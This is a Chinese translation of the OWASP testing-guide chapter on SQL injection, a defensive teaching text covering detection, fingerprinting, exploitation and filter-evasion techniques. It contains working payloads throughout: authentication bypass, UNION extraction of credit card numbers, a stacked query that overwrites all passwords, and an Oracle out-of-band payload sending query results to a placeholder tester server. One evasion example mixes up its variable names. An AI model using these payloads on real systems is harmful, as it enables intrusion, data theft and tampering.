# SQL注入测试

## 概述

SQL 注入测试用于检测是否可能通过向应用程序/网站注入数据，使其在数据库中执行用户控制的 SQL 查询。若应用程序在使用用户输入构造 SQL 查询时未进行适当的输入验证，测试人员即可发现 SQL 注入漏洞。此类漏洞一旦被成功利用，未授权用户便可访问或操纵数据库中的数据，其危害性极大。

[SQL 注入](https://owasp.org/www-community/attacks/SQL_Injection)攻击是指通过数据输入或从客户端（浏览器）向 Web 应用程序传输的部分或完整 SQL 查询的插入或“注入”。成功的 SQL 注入攻击能够从数据库中读取敏感数据、修改数据库数据（插入/更新/删除）、对数据库执行管理操作（如关闭数据库管理系统）、恢复数据库管理系统文件系统上的特定文件内容或将文件写入文件系统，甚至在某些情况下向操作系统发出命令。SQL 注入攻击属于注入攻击的一种，通过将 SQL 命令注入数据平面输入，以影响预定义 SQL 命令的执行。

通常，Web应用程序构建SQL语句的方式是由程序员编写的SQL语法与用户提供的数据混合而成。例如：

`select title, text from news where id=$id`

上例中变量`$id`包含用户提供的数据，其余部分为程序员提供的静态SQL语法，共同组成动态SQL语句。

由于这种构建机制，攻击者可通过构造特定输入试图使原始SQL语句执行其预设的附加操作。以下示例展示用户输入"10 or 1=1"后，通过修改WHERE子句添加"or 1=1"条件，改变了SQL语句的逻辑：

`select title, text from news where id=10 or 1=1`

> **注意：** 向SQL查询注入"OR 1=1"条件时需谨慎。虽然在该注入初始上下文中可能无害，但应用程序常将单个请求的数据用于多个不同查询。若该条件传播到UPDATE或DELETE语句，可能导致意外数据丢失。

## SQL注入攻击分类
SQL注入攻击可分为以下三类：

- **带内注入**：数据通过注入SQL代码时使用的同一通道被提取。这是最直接的攻击方式，检索到的数据会直接显示在应用程序网页中。
- **带外注入**：数据通过不同通道获取（例如：生成包含查询结果的电子邮件并发送给测试者）。
- **推断注入（盲注）**：没有实际的数据传输，但测试者可以通过发送特定请求并观察数据库服务器的响应行为来重构信息。

成功的SQL注入攻击需要攻击者构造语法正确的SQL查询。如果应用程序返回因错误查询生成的错误信息，攻击者更容易重构原始查询的逻辑，从而理解如何正确实施注入。反之，若应用程序隐藏错误详情，测试者则需对原始查询逻辑进行逆向工程。

关于SQL注入漏洞的利用技术，主要存在五种常见手法。这些技术有时可组合使用（例如联合查询与带外注入结合）：

- **联合查询（Union）**：当SQL注入漏洞发生在SELECT语句中时，可通过UNION操作符将两个查询合并为单个结果或结果集。
- **布尔盲注**：利用布尔条件验证特定条件成立与否。
- **报错注入**：通过强制数据库生成错误信息，为攻击者或测试人员提供优化注入的参考信息。
- **带外注入**：通过不同信道检索数据的技术（例如建立HTTP连接将结果发送至Web服务器）。
- **时间延迟注入**：在条件查询中使用数据库命令（如sleep）延迟响应。当攻击者无法从应用程序获得明确反馈（结果、输出或错误）时尤为有效。

## 测试目标

- 识别SQL注入点
- 评估注入漏洞的严重程度及可能获取的访问权限级别

## 测试方法

### 检测技术

本测试的首要步骤是识别应用程序与数据库服务器进行数据交互的场景。典型的数据库交互场景包括：

- **认证表单**：当通过网页表单进行身份验证时，用户凭证通常会与存储用户名和密码（或更安全的密码哈希值）的数据库进行校验。
- **搜索引擎**：用户提交的搜索关键词可能被用于执行SQL查询，从而从数据库中提取相关记录。
- **电子商务网站**：商品及其属性（价格、描述、库存等）通常存储在数据库中。

测试人员需列出所有可能参与SQL查询构造的输入字段（包括POST请求中的隐藏字段），并分别进行测试，尝试干扰查询逻辑以触发错误。同时还需考虑HTTP头部和Cookie等参数。

## 测试方法

### 基础检测技术

初始测试通常涉及向被测字段或参数添加单引号 `'` 或分号 `;`。单引号在SQL中用作字符串终止符，若应用程序未过滤该字符，将导致查询语法错误；分号用于结束SQL语句，未过滤时同样可能引发错误。漏洞字段的典型错误输出示例如下（以Microsoft SQL Server为例）：

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the
character string ''.
/target/target.asp, line 113
```

注释分隔符（`--` 或 `/* */` 等）及其他SQL关键字（如 `AND` 和 `OR`）也可用于尝试修改查询逻辑。一种简单但有时仍有效的技术是在预期为数字的字段中插入字符串，可能触发如下错误：

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
varchar value 'test' to a column of data type int.
/target/target.asp, line 113
```

需全程监控Web服务器的所有响应，并仔细检查HTML/JavaScript源代码。有时错误信息存在于代码中但因某些原因（如JavaScript错误、HTML注释等）未向用户显示。完整的错误信息（如示例所示）可为测试者实施注入攻击提供重要依据。但应用程序通常不会提供详细报错，可能仅返回“500服务器错误”或自定义错误页面，此时需采用盲注技术。关键是要对每个字段单独测试：仅改变一个变量而保持其他参数不变，以准确识别漏洞参数范围。

### 标准SQL注入测试方法

#### 经典SQL注入

考察以下SQL查询语句：

`SELECT * FROM Users WHERE Username='$username' AND Password='$password'`

此类查询通常被Web应用程序用于用户身份验证。若查询返回值，则表明数据库中存在对应凭证的用户，系统将允许该用户登录；反之则拒绝访问。输入字段的值一般通过Web表单从用户端获取。假设我们输入以下用户名和密码值：

`$username = 1' or '1' = '1`
`$password = 1' or '1' = '1`

查询语句将变为：

`SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'`

> **注意：** 向SQL查询中注入`OR 1=1`条件时需格外谨慎。尽管在初始注入上下文中可能无害，但应用程序常会在多个不同查询中复用同一请求的数据。若该条件被传递至UPDATE或DELETE语句，可能导致意外数据丢失。

假设参数值通过GET方法发送至服务器，且漏洞网站域名为`www.example.com`，我们将构造如下请求：

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1`

经简要分析可发现，由于查询条件恒真（`OR 1=1`），该查询将返回值（或一组值）。通过此方式，系统在未知用户名和密码的情况下完成了用户认证。

> 注：某些系统中用户表首行可能为管理员账户，此类场景下返回的可能是该管理员档案。

另一示例查询如下：

`SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))`

本例存在两个问题：一是括号的使用，二是MD5哈希函数的存在。首先通过补充右括号直至形成有效查询来解决括号问题。针对第二个问题，我们通过注释符号绕过第二条件。在查询末尾添加注释起始符，使后续内容被识别为注释。不同数据库管理系统注释语法存在差异，但多数数据库通用符号为`/*`，Oracle则使用`--`。因此设置用户名和密码值为：

`$username = 1' or '1' = '1'))/*`
`$password = foo`

按照此方式，我们将得到以下查询语句：

`SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))`

由于在`$username`值中包含了注释分隔符，查询的密码部分将被忽略。

对应的请求URL为：

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo`

此操作可能返回某些数据值。有时认证代码会验证返回记录/结果的数量是否恰好等于1。在前述示例中，此情况较难实现（因数据库中每个用户仅存一条记录）。为解决此问题，可通过插入SQL命令限定返回结果数量为单条记录。此时需使用`LIMIT <num>`操作符，其中`<num>`为期望返回的结果数量。针对前例，用户名和密码字段值调整如下：

`$username = 1' or '1' = '1')) LIMIT 1/*`
`$password = foo`

最终构造的请求示例如下：

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo`

#### SELECT语句测试

考察以下SQL查询语句：

`SELECT * FROM products WHERE id_product=$id_product`

同时分析执行该查询的脚本请求示例：

`https://www.example.com/product.php?id=10`

当测试人员输入有效值（如本例中的10）时，应用程序将返回对应商品描述。此场景下检测漏洞的有效方法是使用AND和OR操作符进行逻辑测试。

参考以下请求示例：

`https://www.example.com/product.php?id=10 AND 1=2`

对应查询语句：

`SELECT * FROM products WHERE id_product=10 AND 1=2`

此种情况下应用程序可能返回“内容不可用”提示或空白页面。测试人员可继续发送恒真条件验证是否返回有效结果：

`https://www.example.com/product.php?id=10 AND 1=1`

#### 堆叠查询

根据Web应用程序使用的API和数据库管理系统组合（如PHP+PostgreSQL、ASP+SQL SERVER），可能实现在单次调用中执行多条查询。

考察以下SQL查询语句：

`SELECT * FROM products WHERE id_product=$id_product`

该场景的一种利用方式为：

`https://www.example.com/product.php?id=10; INSERT INTO users (…)`

通过此方式可连续执行多个查询，且后续查询与首条查询相互独立。

### 数据库指纹识别

尽管SQL语言是标准化语言，但每个数据库管理系统（DBMS）都有其特性，在特殊命令、数据检索函数（如获取用户名和数据库名称）、特性支持以及注释语法等诸多方面存在差异。

当测试人员进行更高级的SQL注入利用时，必须明确后端数据库的具体类型。

#### 应用程序返回错误分析

识别后端数据库类型的首要方法是通过观察应用程序返回的错误信息。以下是几种数据库的错误消息示例：

MySQL：

```html
You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1
```

使用包含version()函数的完整UNION SELECT查询也有助于识别后端数据库：

`SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1`

Oracle：

`ORA-00933: SQL command not properly ended`

MS SQL Server：

```html
Microsoft SQL Native Client error ‘80040e14’
Unclosed quotation mark after the character string

SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
```

PostgreSQL：

```html
Query failed: ERROR: syntax error at or near
"’" at character 56 in /www/site/test.php on line 121.
```

若未返回错误信息或仅显示自定义错误页面，测试人员可尝试通过多种字符串拼接技术对字符串类型字段进行注入测试。

- MySql: ‘test’ + ‘ing’
- SQL Server: ‘test’ ‘ing’
- Oracle: ‘test’||’ing’
- PostgreSQL: ‘test’||’ing’

### 利用技术

#### UNION利用技术

UNION操作符在SQL注入中用于将测试人员特意构造的查询语句连接到原始查询。构造查询的结果集将与原始查询结果合并，使测试人员能够获取其他数据表的列值。假设服务器执行的原始查询如下：

`SELECT Name, Phone, Address FROM Users WHERE Id=$id`

设置参数值为：

`$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

最终形成完整查询：

`SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

此查询会将原始查询结果与信用卡信息表中所有信用卡号码进行合并。使用`ALL`关键字是为了规避原始查询中可能存在的`DISTINCT`去重操作。值得注意的是，除了信用卡号码外还额外选取了两个数值，这是因为两条查询语句必须保持相同数量的参数/列数才能避免语法错误。

使用此技术进行SQL注入漏洞利用时，测试人员首先需要探明SELECT语句包含的确切列数。

为实现此目的，测试人员可使用 `ORDER BY` 子句并指定数据库列序号进行探测：

`https://www.example.com/product.php?id=10 ORDER BY 10--`

若查询成功执行，可推断本例中 `SELECT` 语句至少包含10个列。若查询失败，则说明返回列数少于10列。若有错误信息返回，通常会提示：

`Unknown column '10' in 'order clause'`

在确定列数后，下一步需探测列的数据类型。假设上文示例中存在3个列，测试人员可通过尝试不同列类型（结合NULL值）进行验证：

`https://www.example.com/product.php?id=10 UNION SELECT 1,null,null--`

若查询失败，通常会返回类似错误信息：

`All cells in a column must have the same datatype`

若查询成功，则首列可能为整数类型。测试人员可继续推进测试流程：

`https://www.example.com/product.php?id=10 UNION SELECT 1,1,null--`

成功完成信息收集后，根据应用程序特性，可能仅显示结果集的首行数据。此时可采用 `LIMIT` 子句或设置无效参数值（假设数据库中不存在ID为99999的条目）使第二条查询结果生效：

`https://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`

<!-- s -->
即，联合查询返回多个查询的多条记录。
当应用程序只显示一条记录，那么对主查询设置无效值而使得构造查询的记录被返回。
对应数据库可能要求在联合查询引用表，若仅想要返回常量自定义数据则随意设置一个存在的表（如，`information_schema.tables`）。
<!-- e -->

#### 隐藏式联合查询利用技术（Hidden Union Exploitation Technique）

当能够通过[联合查询利用技术/WSTG](#union-exploitation-technique)实现SQL注入攻击时最为理想，因为单次请求即可获取查询结果。  

但实际环境中的SQL注入多为盲注。不过部分盲注可被转化为基于联合查询的注入。

**识别方法**  
以下任一方法均可用于识别此类SQL注入：

1. 存在漏洞的查询会返回数据，但注入点呈盲注特征。
2. `ORDER BY` 技术有效，但无法实现联合查询注入。

**根本原因**  
常规联合查询技术失效的根源在于存在漏洞的查询结构复杂。在联合查询技术中，需在`UNION`载荷后注释掉原查询剩余部分。这对简单查询可行，但在复杂查询中可能引发问题——若查询前半部分依赖后半部分的逻辑，注释剩余内容将破坏原始查询结构。

**场景1**  
存在漏洞的查询是子查询，且父查询负责处理数据返回。

```text
SELECT 
  * 
FROM 
  customers 
WHERE 
  id IN (                 --\
    SELECT                   |
      DISTINCT customer_id   |
    FROM                     |
      orders                 |--> vulnerable query
    WHERE                    |
      cost > 200             |
  );                      --/
```

- **问题**：若注入`UNION`载荷未影响返回数据，原因可能是仅修改了`WHERE`子句。实际上并未将`UNION`查询附加到原始查询中。  
- **解决方案**：需明确后端实际执行的查询结构，据此构造载荷。包括补全括号或按需添加关键字段。

**场景2**  
存在漏洞的查询包含别名或变量声明。

```text
SELECT 
  s1.user_id, 
  (                                                                                      --\
    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = 'INJECTION_HERE' THEN 1 ELSE 0 END   |--> vulnerable query
  ) AS overlap                                                                           --/
FROM 
  subscriptions AS s1 
  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id 
  AND s1.start_date <= s2.end_date 
  AND s1.end_date >= s2.start_date 
GROUP BY 
  s1.user_id
```

- **问题**：在注入载荷后注释原始查询剩余部分会导致查询失效，因为部分别名或变量将变为`undefined`状态。  
- **解决方案**：需在载荷起始位置添加适当的关键字或别名，从而维持原始查询前半部分的有效性。

<!-- s -->
`AS` 创建别名：`表 AS 别名`
`LEFT JOIN` 连接
此处为 `subscriptions` 表创建两个别名后条件查询不同用户的日期是否重叠
<!-- e -->

**场景3**  
存在漏洞的查询结果被用于第二次查询，实际返回数据的是第二条查询而非原始查询。

```text
<?php
// retrieves product ID based on product name
                            --\
$query1 = "SELECT              |
             id                |
           FROM                |
             products          |--> vulnerable query #1
           WHERE               |
             name = '$name'";  |
                            --/
$result1 = odbc_exec($conn, $query1);
// retrieves product's comments based on the product ID
                              --\
$query2 = "SELECT                |
             comments            |
           FROM                  |
             products            |--> vulnerable query #2
           WHERE                 |
             id = '$result1'";   |
                              --/
$result1 = odbc_exec($conn, $query2);
?>
```

- 问题：向首条查询添加`UNION`载荷不会影响最终返回数据。  
- 解决方案：需针对第二条查询实施注入。要确保输入第二条查询的数据未被净化处理，同时使首条查询不返回数据，随后附加可向_第二条查询_注入目标载荷的`UNION`查询。
  
- 示例：  
    基础载荷结构（注入首条查询的内容）：

    ```text
    ' AND 1 = 2 UNION SELECT "PAYLOAD" -- -
    ```

    `PAYLOAD` 指需要注入到_第二条查询_的具体内容：
    
    ```text
    ' AND 1=2 UNION SELECT ...
    ```

    最终载荷（替换`PAYLOAD`后）：
    
    ```text
    ' AND 1 = 2 UNION SELECT "' AND 1=2 UNION SELECT ..." -- -
                            \________________________/
                                        ||
                                        \/
                                    the payload that
                                    get's injected
                                into the second query
    \________________________________________________________/
                                ||
                                \/
    the actual query we inject into the vulnerable parameter
    ```

    注入后的首条查询：
    
    ```text
    SELECT               --\
    id                    |
    FROM                    |----> first query
    products              |
    WHERE                   |
    name = 'abcd'      --/
    AND 1 = 2                                 --\
    UNION                                          |----> injected payload (what gets injected into the second payload)
    SELECT                                         |
    "' AND 1=2 UNION SELECT ... -- -" -- -'   --/
    ```

    注入后的第二条查询：
    
    ```text
    SELECT            --\
    comments           |
    FROM                 |----> second query
    products           |
    WHERE                |
    id = ''         --/
    AND 1 = 2         --\ 
    UNION                  |----> injected payload (the final UNION query that controls the returned data)
    SELECT ... -- -'    --/
    ```

**场景4**  
存在漏洞的参数被用于多个独立查询中：

```text
<?php
//retrieving product details based on product ID
$query1 = "SELECT 
             name, 
             inserted, 
             size 
           FROM 
             products 
           WHERE 
             id = '$id'";
$result1 = odbc_exec($conn, $query1);
//retrieving product comments based on the product ID
$query2 = "SELECT 
             comments 
           FROM 
             products 
           WHERE 
             id = '$id'";
$result2 = odbc_exec($conn, $query2);
?>
```

- 问题：向第一条（或第二条）查询附加`UNION`查询不会破坏该查询，但可能导致其他查询异常。  
- 解决方案：具体方案取决于应用程序的代码结构。首要步骤是明确原始查询逻辑。多数情况下此类注入属于时间盲注，且基于时间的载荷会同时注入多个查询从而引发异常。  
  例如使用`SQLMap`工具时，这种场景会干扰工具判断导致输出混乱，因为实际延迟效果会与预期不符。

**提取原始查询**  

可见，实现联合查询注入始终需要明确原始查询语句。

可通过默认数据库管理系统表获取原始查询：

| DBMS                 | Table                          |
|----------------------|--------------------------------|
| MySQL                | INFORMATION_SCHEMA.PROCESSLIST |
| PostgreSQL           | pg_stat_activity               |
| Microsoft SQL Server | sys.dm_exec_cached_plans       |
| Oracle               | V$SQL                          |

**自动化流程**  

实现自动化的步骤：

1. 使用`SQLMap`结合盲注技术提取原始查询。
2. 根据原始查询构建基础载荷，实现联合查询注入。
3. 通过以下任一方式自动化利用联合查询注入：  
    - 指定*自定义注入点标记*（`*`）
    - 使用`--prefix`和`--suffix`参数

**示例：**  
考虑前述第三种场景。  
假设数据库为`MySQL`，且第一、第二条查询均仅返回单列。  
以下为提取数据库版本的载荷：

```text
' AND 1=2 UNION SELECT " ' AND 1=2 UNION SELECT @@version -- -" -- -
```

目标URL格式如下：

```text
https://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+"+'AND 1=2+UNION+SELECT+@@version+--+-"+--+-
```

自动化方案：  

- *自定义注入点标记*（`*`）：

  ```text
  sqlmap -u "https://example.org/search?query=abcd'AND 1=2 UNION SELECT \"*\"-- -"
  ```

- `--prefix`和`--suffix`参数：

  ```text
  sqlmap -u "https://example.org/search?query=abcd" --prefix="'AND 1=2 UNION SELECT \"" --suffix="\"-- -"
  ```

#### 布尔盲注利用技术（Boolean Exploitation Technique）

当测试人员发现[盲注SQL注入](https://owasp.org/www-community/attacks/Blind_SQL_Injection)场景时，布尔盲注技术尤为实用——此类场景下无法直接获取操作结果信息。例如，当程序员设置了不透露任何查询结构或数据库信息的自定义错误页面时（页面不返回SQL错误，可能仅返回HTTP 500、404状态码或重定向），便会触发此类行为。

通过推理检测方法，可突破此限制并成功还原目标字段取值。该方法原理是向服务器发送系列布尔查询请求，观察响应特征并最终推导响应含义。我们以`www.example.com`为例，假设其存在名为`id`的SQL注入漏洞参数。当执行以下请求时：

`https://www.example.com/index.php?id=1'`

由于查询语句存在语法错误，将返回自定义错误页面。假设服务器端执行的查询为：

`SELECT field1, field2, field3 FROM Users WHERE Id='$Id'`

该漏洞可通过前文所述方法进行利用。我们的目标是获取用户名字段的值。通过逐字符提取的方式，我们将执行一系列测试来还原该字段的完整取值。利用几乎所有数据库都支持的标准函数即可实现此过程。本例中将使用以下伪函数说明：

- SUBSTRING (文本, 起始位置, 长度)：返回从文本"起始位置"开始截取指定"长度"的子串。若"起始位置"超出文本长度，函数返回空值。

- ASCII (字符)：返回输入字符的ASCII码值。若字符为0则返回空值。

- LENGTH (文本)：返回输入文本的字符数量。

通过这些函数，我们将首先对首字符进行测试，确定其值后继续检测后续字符，直至还原完整取值。测试过程将利用SUBSTRING函数每次仅选取一个字符（通过将长度参数设为1实现），并结合ASCII函数获取字符的ASCII码值以进行数值比较。通过遍历ASCII码表所有可能值进行对比校验，直至匹配到正确数值。以下为`Id`参数的示例取值：

`$Id=1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1`

该操作生成以下查询（下文统称为"推断查询"）：

`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'`

当且仅当用户名字段的首字符ASCII值等于97时，前述示例才会返回结果。若返回假值，则将ASCII表索引从97递增至98后重复请求；若获得真值，则重置ASCII表索引为零，并通过修改SUBSTRING函数参数继续分析后续字符。核心问题在于如何区分返回真值与假值的测试场景。为此需构造恒返回假值的查询，可通过以下`Id`值实现：

`$Id=1' AND '1' = '2`

该输入将生成如下查询：

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'`

服务器返回的响应（即HTML代码）将作为测试的假值基准。通过对比推断查询结果与该基准值即可验证测试结果。但此方法有时会失效——若连续两次相同请求返回不同页面内容，则无法区分真值与假值。此时需采用特殊过滤技术消除两次请求间的动态代码差异，提取静态页面模板。后续每次执行推断查询时，通过相同函数从响应中提取对应模板，通过模板比对判定测试结果。

前文未讨论测试终止条件的判定问题（即何时结束推断过程）。可利用SUBSTRING函数与LENGTH函数的特性实现：当测试字符与ASCII码0（空值）比较返回真值时，存在两种情况：推断过程已完成（已扫描完整字符串），或所分析值包含空字符。

此时需为`Id`字段插入以下值：

`$Id=1' OR LENGTH(username)=N AND '1' = '1`

其中N为当前已分析字符数，不包含空值。

对应查询语句为：

`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR LENGTH(username)=N AND '1' = '1'`

该查询返回布尔值。若为真则推断完成且已获取参数值；若为假则表明参数值中存在空字符，需继续分析后续字符直至遇到下一个空值。
<!-- s -->
此处并非常见的使用 LENGTH 获取字符串长度后进行对应次数的循环，
而是持续探测当前字符串的进度是否匹配字符串长度。
<!-- e -->

盲注攻击需要执行大量查询，测试人员通常需借助自动化工具实现漏洞利用。

#### 错误回显注入技术

当测试人员因故无法使用联合查询（UNION）等技术利用SQL注入漏洞时，错误回显注入技术尤为实用。该技术通过强制数据库执行会触发错误的操作，并尝试在错误信息中提取数据库数据。具体实现方式因数据库管理系统而异（请参阅各DBMS专属章节）。

考虑以下SQL查询：

`SELECT * FROM products WHERE id_product=$id_product`

以及执行该查询的脚本请求：

`https://www.example.com/product.php?id=10`

恶意请求示例（以Oracle 10g为例）：

`https://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`

此例中，测试人员将数值10与`UTL_INADDR.GET_HOST_NAME`函数的执行结果进行拼接。该Oracle函数会尝试解析参数的主机名（此处为查询当前用户的子查询），当数据库使用用户名作为主机名进行查询时，将触发错误并返回如下信息：

`ORA-292257: host SCOTT unknown`

测试人员可通过操纵传入GET_HOST_NAME()函数的参数，使查询结果显现在错误消息中。

#### 带外数据注入技术

当测试人员遭遇[盲注SQL注入](https://owasp.org/www-community/attacks/Blind_SQL_Injection)场景（无法直接获取操作结果信息）时，该技术尤为实用。其原理是利用数据库管理系统函数建立带外连接，将注入查询结果通过请求发送至测试者服务器。与错误回显技术类似，不同DBMS需使用特定函数，请参阅各数据库专属章节。

考虑以下SQL查询：

`SELECT * FROM products WHERE id_product=$id_product`

以及执行该查询的脚本请求：

`https://www.example.com/product.php?id=10`

恶意请求示例：

`https://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL))--`

此例中，测试人员将数值10与`UTL_HTTP.request`函数执行结果进行拼接。该Oracle函数会尝试连接`testerserver`服务器，并发起包含`SELECT user FROM DUAL`查询结果作为 URL 路径的HTTP GET请求。测试人员可通过配置Web服务器（如Apache）或使用Netcat工具实现数据接收：

```bash
/home/tester/nc –nLp 80

GET /带外数据 HTTP/1.1
Host: testerserver.com
Connection: close
```

#### 时间延迟利用技术（Time Delay Exploitation Technique）

当测试人员遇到[盲注SQL注入](https://owasp.org/www-community/attacks/Blind_SQL_Injection)场景（无法直接获取操作结果信息）时，时间延迟技术尤为实用。该技术通过发送注入查询语句，当条件为真时监测服务器响应耗时。若出现延迟即可判定条件查询结果为真。具体实现方式因数据库管理系统而异（请参阅各DBMS专属章节）。
考虑以下SQL查询：

`SELECT * FROM products WHERE id_product=$id_product`

以及执行该查询的脚本请求：

`https://www.example.com/product.php?id=10`

恶意请求示例（以MySql 5.x为例）：

`https://www.example.com/product.php?id=10 AND IF(version() like '5%', sleep(10), 'false'))--`

此例中，测试人员通过判断MySQL版本是否为5.x系列，使服务器延迟响应10秒。可通过增加延迟时长并监测响应来实现检测，测试者亦无需等待完整响应——有时可设置较高延迟值（如100秒）并在数秒后主动取消请求。

#### 存储过程注入（Stored Procedure Injection）

当存储过程中使用动态SQL时，应用程序必须对用户输入进行参数化处理以消除代码注入风险。若未进行参数化，用户可能输入恶意SQL代码并在存储过程中执行。

考虑以下SQL Server存储过程示例：

```sql
Create procedure user_login @username varchar(20), @passwd varchar(20)
As

Declare @sqlstring varchar(250)

Set @sqlstring  = 
'Select 1 from users Where username = ' + @username + ' and passwd = ' + @passwd

exec(@sqlstring)

Go
```
<!-- s -->
`Create procedure` 创建储存过程
`AS ... GO` 定义过程边界
`DECLARE` 声明局部变量
<!-- e -->

用户输入示例：

```sql
anyusername or 1=1'
anypassword
```

由于该存储过程未对输入进行参数化，将返回符合参数条件的现有记录。

> 此示例因使用动态SQL进行用户登录而看似不常见，但考虑动态报表查询场景（用户选择查看列时），攻击者可在此场景插入恶意代码导致数据泄露。

考虑以下SQL Server存储过程示例：

```sql
Create
procedure get_report @columnamelist varchar(7900)
As
Declare @sqlstring varchar(8000)
Set @sqlstring  = 
'Select ' + @columnamelist + ' from ReportTable'
exec(@sqlstring)
Go
```

用户输入示例：

```sql
1 from users; update users set password = 'password'; select *
```

这将导致报表运行的同时更新所有用户密码。

#### 自动化利用（Automated Exploitation）

本文所述多数场景和技术均可通过工具实现自动化检测。测试人员可查阅[使用SQLMap进行自动化审计](https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap)获取自动化审计实施方案。

### SQL注入签名规避技术

该技术用于绕过Web应用防火墙（WAF）或入侵防御系统（IPS）等防护机制。另请参阅[SQL注入绕过WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)

#### 空白符混淆

通过删除空格或添加不影响SQL语句执行的空格实现绕过。例如：

```sql
or 'a'='a'

or 'a'  =    'a'
```

使用换行符、制表符等不影响SQL执行的特殊字符。例如：

```sql
or
'a'=
        'a'
```

#### 空字节

在过滤器拦截的任意字符前使用空字节（%00）。

例如，攻击者可能注入以下 SQL 语句：

`' UNION SELECT password FROM Users WHERE username='admin'--`

添加空字节后变为：

`%00' UNION SELECT password FROM Users WHERE username='admin'--`

#### SQL 注释

添加 SQL 内联注释同样可使 SQL 语句保持有效并绕过 SQL 注入过滤器。以以下 SQL 注入为例：

`' UNION SELECT password FROM Users WHERE name='admin'--`

添加 SQL 内联注释后：

`'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--`

`'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--`

#### URL编码

使用[在线URL编码工具](https://meyerweb.com/eric/tools/dencoder/)对SQL语句进行编码

`' UNION SELECT password FROM Users WHERE name='admin'--`

经过URL编码的SQL注入语句将变为

`%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--`

#### 字符编码

Char()函数可用于替换英文字符。例如，char(114,111,111,116)表示root

`' UNION SELECT password FROM Users WHERE name='root'--`

应用Char()函数后，SQL注入语句将变为

`' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--`

#### 字符串拼接

拼接技术通过拆分SQL关键字来规避过滤器检测。拼接语法因数据库引擎而异。以MS SQL引擎为例：

`select 1`

这条简单的SQL语句可通过拼接方式改写为：

`EXEC('SEL' + 'ECT 1')`

#### 十六进制编码

十六进制编码技术使用十六进制编码替换原始SQL语句字符。例如，`root`可表示为`726F6F74`

`Select user from users where name = 'root'`

使用十六进制值后的SQL语句将变为：

`Select user from users where name = 726F6F74`
或
`Select user from users where name = unhex('726F6F74')`
<!-- s -->
直接使用十六进制值似乎无效？
<!-- e -->

#### 变量声明

将SQL注入语句声明为变量并执行。
例如，将以下SQL注入语句

`Union Select password`

将SQL语句定义为变量`SQLivar`

```sql
; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
EXEC(@SQLivar)
```

#### 'or 1 = 1' 的其他表达方式

```sql
OR 'SQLi' = 'SQL'+'i'
OR 'SQLi' &gt; 'S'
or 20 &gt; 1
OR 2 between 3 and 1
OR 'SQLi' = N'SQLi'
1 and 1 = 1
1 || 1 = 1
1 && 1 = 1
```

### SQL通配符注入

大多数SQL方言同时支持单字符通配符（通常为"`?`"或"`_`"）和多字符通配符（通常为"`%`"或"`*`"），这些通配符可在使用`LIKE`操作符的查询中使用。即使采用了适当的防护措施（如参数化查询或预编译语句）来防范SQL注入攻击，攻击者仍可能向查询中注入通配符。

例如，某网络应用在结算流程中允许用户输入折扣码，并通过类似`SELECT * FROM discount_codes WHERE code LIKE ':code'`的查询验证该码是否存在于数据库中。若用户输入`%`（该值将替换`:code`参数），则会匹配所有折扣码。

此技术还可通过逐步细化的查询（如`a%`、`b%`、`ba%`等）推断出确切的折扣码。

## 修复方案

- 防护应用免受SQL注入漏洞威胁，请参阅[OWASP SQL注入防护速查表](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- 加固SQL服务器安全，请参阅[OWASP 数据库安全速查表](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html)

通用输入验证安全方案请参阅[OWASP 输入验证速查表](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

## 工具

- [SQL注入模糊测试字符串（来自wfuzz工具）- Fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)
- [Bernardo Damele A. G.: sqlmap，自动化SQL注入工具](https://sqlmap.org/)
- [Muhaimin Dzulfakar: MySqloit，MySQL注入接管工具](https://github.com/dtrip/mysqloit)
- [SQL注入 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## 参考资料

